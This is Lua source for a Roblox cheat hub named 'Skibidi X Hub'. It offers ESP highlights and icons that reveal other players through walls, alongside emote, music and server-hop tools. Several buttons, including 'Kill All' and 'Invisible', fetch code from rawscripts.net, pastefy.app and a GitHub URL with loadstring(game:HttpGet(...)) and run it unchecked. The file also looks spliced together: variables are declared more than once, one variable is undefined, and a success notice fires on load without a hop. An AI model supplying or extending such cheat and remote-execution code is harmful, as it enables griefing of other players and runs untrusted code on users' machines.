local V2Highlights = {}
local ColorConn

local ColorList = {
    Color3.fromRGB(255,0,0),
    Color3.fromRGB(255,128,0),
    Color3.fromRGB(255,255,0),
    Color3.fromRGB(0,255,0),
    Color3.fromRGB(0,255,255),
    Color3.fromRGB(0,0,255),
    Color3.fromRGB(255,0,255),
}

local ColorIndex, NextIndex, Blend = 1, 2, 0
local Speed = 0.35

local function AddV2(plr)
    if plr == LocalPlayer then return end
    if V2Highlights[plr] or not plr.Character then return end

    local h = Instance.new("Highlight")
    h.Name = "ESP_HIGHLIGHT_V2"
    h.Adornee = plr.Character
    h.FillTransparency = HighlightTransparency
    h.OutlineTransparency = 0
    h.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    h.Parent = workspace

    V2Highlights[plr] = h
end

local function RemoveV2()
    for _, h in pairs(V2Highlights) do
        if h then h:Destroy() end
    end
    table.clear(V2Highlights)
end

local function StartV2()
    if ColorConn then return end
    ColorConn = RunService.RenderStepped:Connect(function(dt)
        Blend += dt * Speed
        if Blend >= 1 then
            Blend = 0
            ColorIndex = NextIndex
            NextIndex = (NextIndex % #ColorList) + 1
        end

        local col = ColorList[ColorIndex]:Lerp(ColorList[NextIndex], Blend)
        for _, h in pairs(V2Highlights) do
            if h then
                h.FillColor = col
                h.OutlineColor = col
                h.FillTransparency = HighlightTransparency
            end
        end
    end)
end

local function StopV2()
    if ColorConn then
        ColorConn:Disconnect()
        ColorConn = nil
    end
    RemoveV2()
end

VisualsTab:AddSection({
    Name = "ESP Highlight"
})

VisualsTab:AddToggle({
    Name = "ESP Highlight V1",
    Default = false,
    Callback = function(v)
        HighlightEnabled = v
        RefreshHighlight()
    end
})

VisualsTab:AddToggle({
    Name = "ESP Highlight V2",
    Default = false,
    Callback = function(v)
        V2Enabled = v
        if v then
            for _, p in ipairs(Players:GetPlayers()) do
                AddV2(p)
            end
            StartV2()
        else
            StopV2()
        end
    end
})

VisualsTab:AddColorpicker({
    Name = "Highlight Color",
    Default = HighlightColor,
    Callback = function(c)
        HighlightColor = c
    end
})

VisualsTab:AddSlider({
    Name = "Transparency",
    Min = 0,
    Max = 1,
    Default = HighlightTransparency,
    Increment = 0.01,
    Callback = function(v)
        HighlightTransparency = v
    end
})

Players.PlayerAdded:Connect(function(plr)
    if HighlightEnabled then CreateHighlight(plr) end
    if V2Enabled then AddV2(plr) end
end)

Players.PlayerRemoving:Connect(function(plr)
    RemoveHighlight(plr)
    if V2Highlights[plr] then
        V2Highlights[plr]:Destroy()
        V2Highlights[plr] = nil
    end
end)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local EspIconEnabled = false
local EspObjects = {}

local function RemoveEspIcon(plr)
    if EspObjects[plr] then
        EspObjects[plr]:Destroy()
        EspObjects[plr] = nil
    end
end

local function CreateEspIcon(plr)
    if not EspIconEnabled then return end
    if plr == LocalPlayer then return end
    if EspObjects[plr] then return end
    if not plr.Character then return end

    local head = plr.Character:WaitForChild("Head", 5)
    if not head then return end

    local gui = Instance.new("BillboardGui")
    gui.Name = "ESP_ICON"
    gui.Size = UDim2.new(0, 70, 0, 80)
    gui.StudsOffset = Vector3.new(0, 2.2, 0)
    gui.AlwaysOnTop = true
    gui.Adornee = head
    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame", gui)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundTransparency = 1

    local img = Instance.new("ImageLabel", frame)
    img.Size = UDim2.new(0, 44, 0, 44)
    img.Position = UDim2.new(0.5, -22, 0, 0)
    img.BackgroundTransparency = 1
    img.Image =
        ("rbxthumb://type=AvatarHeadShot&id=%d&w=180&h=180")
        :format(plr.UserId)

    local txt = Instance.new("TextLabel", frame)
    txt.Size = UDim2.new(1, 0, 0, 18)
    txt.Position = UDim2.new(0, 0, 0, 46)
    txt.BackgroundTransparency = 1
    txt.Text = plr.Name
    txt.TextScaled = true
    txt.Font = Enum.Font.GothamBold
    txt.TextColor3 = Color3.new(1,1,1)
    txt.TextStrokeTransparency = 0.25
    txt.TextStrokeColor3 = Color3.new(0,0,0)

    EspObjects[plr] = gui
end

VisualsTab:AddSection({ Name = "ESP Icon" })

VisualsTab:AddToggle({
    Name = "ESP (Icon)",
    Default = false,
    Callback = function(v)
        EspIconEnabled = v

        for _, plr in ipairs(Players:GetPlayers()) do
            RemoveEspIcon(plr)
            if v then
                task.spawn(function()
                    CreateEspIcon(plr)
                end)
            end
        end
    end
})

TsbTab:AddButton({
    Name = "Itadori Yuji",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/The-Strongest-Battlegrounds-YUJI-X-SUKUNA-moveset-50302"))()
    end
})

TsbTab:AddButton({
    Name = "Gojo Satoru",
    Callback = function()
        loadstring(game:HttpGet("https://rawscripts.net/raw/KJ-The-Strongest-Battlegrounds-battleground-gojo-script-saitama-to-gojo-26980"))()
    end
})

TsbTab:AddButton({
    Name = "???",
    Callback = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/IdkRandomUsernameok/PublicAssets/refs/heads/main/Releases/MUI.lua"))()
    end
})

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local backpack = LocalPlayer:WaitForChild("Backpack")

local function GetHumanoid()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    return char:WaitForChild("Humanoid")
end

local humanoid = GetHumanoid()

local animator = humanoid:FindFirstChildOfClass("Animator")
if not animator then
    animator = Instance.new("Animator")
    animator.Parent = humanoid
end

-- =====================
-- Animations
-- =====================
local Animations = {
    ["Faint"] = "rbxassetid://181526230",
    ["Levitate"] = "rbxassetid://313762630",
    ["Spinner"] = "rbxassetid://188632011",
    ["Float Sit"] = "rbxassetid://179224234",
    ["Scared"] = "rbxassetid://180612465",
    ["Floating Head"] = "rbxassetid://121572214",
    ["Crouch"] = "rbxassetid://182724289",
    ["Moving Dance"] = "rbxassetid://429703734",
    ["Spin Dance"] = "rbxassetid://429730430",
    ["Spin Dance 2"] = "rbxassetid://186934910",
    ["Floor Faint"] = "rbxassetid://181525546",
    ["Bow Down"] = "rbxassetid://204292303",
    ["Sword Slam"] = "rbxassetid://204295235",
    ["Insane"] = "rbxassetid://33796059",
    ["Mega Insane"] = "rbxassetid://184574340",
    ["Moon Dance"] = "rbxassetid://45834924",
    ["Arm Turbine"] = "rbxassetid://259438880",
    ["Barrel Roll"] = "rbxassetid://136801964",
    ["Insane Arms"] = "rbxassetid://27432691",
}

local currentTrack
local currentTool

local function ToggleAnimation(animId, tool)
    if currentTrack and currentTool == tool then
        currentTrack:Stop()
        currentTrack:Destroy()
        currentTrack = nil
        currentTool = nil
        return
    end

    if currentTrack then
        currentTrack:Stop()
        currentTrack:Destroy()
    end

    local anim = Instance.new("Animation")
    anim.AnimationId = animId
    currentTrack = animator:LoadAnimation(anim)
    currentTrack.Looped = true
    currentTrack:Play()
    currentTool = tool
end

MiscTab:AddSection({ Name = "EMOTE TOOL" })

local SelectedEmote = ""

local emoteList = {}
for name in pairs(Animations) do
    table.insert(emoteList, name)
end
table.sort(emoteList)

MiscTab:AddDropdown({
    Name = "Select Emote",
    Default = "",
    Options = emoteList,
    Callback = function(v)
        if typeof(v) == "table" then
            SelectedEmote = v[1] or ""
        else
            SelectedEmote = v or ""
        end
    end
})

MiscTab:AddButton({
    Name = "Emote GET",
    Callback = function()
        if SelectedEmote == "" then return end
        if backpack:FindFirstChild(SelectedEmote) then return end

        local animId = Animations[SelectedEmote]
        if not animId then return end

        local tool = Instance.new("Tool")
        tool.Name = SelectedEmote
        tool.RequiresHandle = false
        tool.Parent = backpack

        tool.Activated:Connect(function()
            ToggleAnimation(animId, tool)
        end)
    end
})

local SoundService = game:GetService("SoundService")

local MusicSound = Instance.new("Sound")
MusicSound.Name = "MiscMusicPlayer"
MusicSound.Volume = 2
MusicSound.Looped = true
MusicSound.Parent = SoundService

local CurrentMusicId = ""

MiscTab:AddSection({ Name = "Music Player" })

MiscTab:AddTextbox({
    Name = "Audio ID",
    Default = "",
    TextDisappear = false,
    Callback = function(text)
        CurrentMusicId = text
    end
})

MiscTab:AddButton({
    Name = "Play Music",
    Callback = function()
        if CurrentMusicId == "" then return end
        MusicSound:Stop()
        MusicSound.SoundId = "rbxassetid://" .. CurrentMusicId
        MusicSound:Play()
    end
})

MiscTab:AddButton({
    Name = "Stop Music",
    Callback = function()
        MusicSound:Stop()
    end
})

MiscTab:AddSlider({
    Name = "Volume",
    Min = 0,
    Max = 5,
    Default = 2,
    Increment = 0.1,
    Callback = function(v)
        MusicSound.Volume = v
    end
})

MiscTab:AddSection({ Name = "Trolls" })

MiscTab:AddButton({
    Name = "Invisible",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/OBYJ1UWC/raw"))()
    end
})

MiscTab:AddButton({
    Name = "Kill All",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/aW96SQyL/raw"))()
    end
})

local TeleportService = game:GetService("TeleportService")

MiscTab:AddSection({ Name = "Server" })

MiscTab:AddButton({
    Name = "Rejoin Server",
    Callback = function()
        TeleportService:TeleportToPlaceInstance(
            game.PlaceId,
            game.JobId,
            player
        )
    end
})

MiscTab:AddButton({
    Name = "Server Hop",
    Callback = function()
        TeleportService:Teleport(game.PlaceId, player)
    end
})

OrionLib:MakeNotification({
    Name = "Server Hop",
    Content = "Server Hop Successfully!",
    Time = 3
})

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer

InformationTab:AddSection({ Name = "Account Info" })

InformationTab:AddLabel("Username : " .. LocalPlayer.Name)
InformationTab:AddLabel("UserId : " .. LocalPlayer.UserId)
InformationTab:AddLabel("Account Age : " .. LocalPlayer.AccountAge .. " days")

InformationTab:AddSection({ Name = "Game Info" })

local gameName = "Unknown"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)

InformationTab:AddLabel("Game : " .. gameName)
InformationTab:AddLabel("Game ID : " .. game.PlaceId)

InformationTab:AddSection({ Name = "Device & Server" })

local device = "Unknown"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    device = "Mobile"
elseif UserInputService.KeyboardEnabled then
    device = "PC"
end

InformationTab:AddLabel("Device : " .. device)

local playerCountLabel = InformationTab:AddLabel("Server Players : Loading...")

local function UpdatePlayerCount()
    playerCountLabel:Set(
        "Server Players : "
        .. #Players:GetPlayers()
        .. " / "
        .. Players.MaxPlayers
    )
end

Players.PlayerAdded:Connect(UpdatePlayerCount)
Players.PlayerRemoving:Connect(UpdatePlayerCount)
UpdatePlayerCount()

DiscordTab:AddSection({ Name = "Discord" })

DiscordTab:AddLabel("Join our Skibidi X Hub official Discord server")

DiscordTab:AddButton({
    Name = "Copy Discord Server Link",
    Callback = function()
        if setclipboard then
            setclipboard("https://discord.gg/VS5eB8DfXt")
        end
        OrionLib:MakeNotification({
            Name = "Discord",
            Content = "Invite link copied to clipboard!",
            Time = 3
        })
    end
})

OrionLib:Init()